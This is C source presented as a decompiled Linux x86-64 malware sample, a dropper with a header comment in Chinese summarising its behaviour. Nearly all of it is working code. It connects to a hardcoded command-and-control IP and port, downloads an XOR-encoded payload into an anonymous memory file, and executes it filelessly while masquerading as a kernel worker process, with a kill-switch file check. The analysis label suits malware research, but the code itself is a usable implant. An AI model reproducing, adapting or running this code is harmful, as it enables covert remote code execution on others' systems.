/*
 * 反编译自: linux_amd64_tcp.c (143a077ftcp)
 * ELF 64-bit x86-64, not stripped, GCC 4.9.4
 *
 * WARNING: This is MALWARE - a reverse-shell backdoor / dropper.
 *          For analysis/research purposes only.
 *
 * 行为概要:
 *   1. 检测 /tmp/log_de.log 是否存在，若存在则自杀（kill switch）
 *   2. 连接 C2 服务器 24.144.123.109:20480
 *   3. 发送握手包（版本标识 "l64" + 端口号 + 32字节IP标识）
 *   4. 使用 memfd_create(319) 创建匿名内存文件描述符
 *   5. 从 C2 接收载荷，用 XOR 0x99 解密后写入 memfd
 *   6. 通过 fexecve 从内存执行载荷（无文件落地，进程伪装为 [kworker/0:2]）
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/syscall.h>

#define C2_HOST       "24.144.123.109"
#define C2_PORT       20480           /* 0x5000 */
#define KILL_FILE     "/tmp/log_de.log"
#define FAKE_NAME     "[kworker/0:2]"
#define XOR_KEY       0x99
#define MEMFD_NAME    "a"
#define BUF_SIZE      0x1000

#ifndef SYS_memfd_create
#define SYS_memfd_create 319          /* x86-64 */
#endif

int main(int argc, char *argv[])
{
    struct sockaddr_in addr;
    int sock_fd, mem_fd;
    char host[33];                    /* rsp+0x2f, receives 0x21-byte copy of IP */
    char buf[BUF_SIZE];              /* rsp+0x450 */
    char port_buf[2];                /* rsp+0x02 */
    ssize_t n;

    /* Kill switch: if marker file exists, exit silently */
    if (access(KILL_FILE, F_OK) == 0) {
        exit(0);
    }

    /* Copy C2 IP address into stack buffer (33 bytes, incl. null) */
    memcpy(host, C2_HOST, 0x21);

    /* Setup sockaddr_in */
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(C2_PORT);

    /* DNS resolve: gethostbyname fails on raw IP, falls back to inet_addr */
    struct hostent *he = gethostbyname(host);
    if (he != NULL) {
        addr.sin_addr.s_addr = *(in_addr_t *)he->h_addr_list[0];
    } else {
        addr.sin_addr.s_addr = inet_addr(host);
    }

    /* Create TCP socket */
    sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_fd < 0) {
        return 0;
    }

    /* TCP_KEEPIDLE = 10 seconds */
    int keepidle = 10;
    setsockopt(sock_fd, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(keepidle));

    /* Connect to C2 with retry loop (sleep 10s on failure) */
    while (connect(sock_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        sleep(10);
    }

    /* --- Handshake --- */

    /* 1) Send 6-byte version string */
    send(sock_fd, "l64   ", 6, 0);

    /* 2) Send port as 2 bytes big-endian */
    port_buf[0] = (addr.sin_port) & 0xFF;
    port_buf[1] = (addr.sin_port >> 8) & 0xFF;
    send(sock_fd, port_buf, 2, 0);

    /* 3) Send 32-byte identifier (IP address string) */
    send(sock_fd, host, 0x20, 0);

    /* --- Payload reception --- */

    /* Create anonymous in-memory file (memfd_create via syscall 319) */
    mem_fd = syscall(SYS_memfd_create, MEMFD_NAME, 0);
    if (mem_fd < 0) {
        return 0;
    }

    /* Receive loop: read from socket, XOR-decrypt, write to memfd */
    while (1) {
        n = recv(sock_fd, buf, BUF_SIZE, 0);
        if (n <= 0) {
            break;
        }

        for (ssize_t i = 0; i < n; i++) {
            buf[i] ^= XOR_KEY;
        }

        write(mem_fd, buf, n);
    }

    /* Connection closed - clean up and prepare execution */
    memset(buf, 0, BUF_SIZE);
    close(sock_fd);

    /* Resolve real path and set CWD env var */
    char exe_path[512];
    realpath(argv[0], exe_path);
    setenv("CWD", exe_path, 1);

    /* Execute payload from memory fd, disguised as [kworker/0:2] */
    char *args[] = { FAKE_NAME, NULL };
    extern char **environ;
    fexecve(mem_fd, args, environ);

    return 0;
}
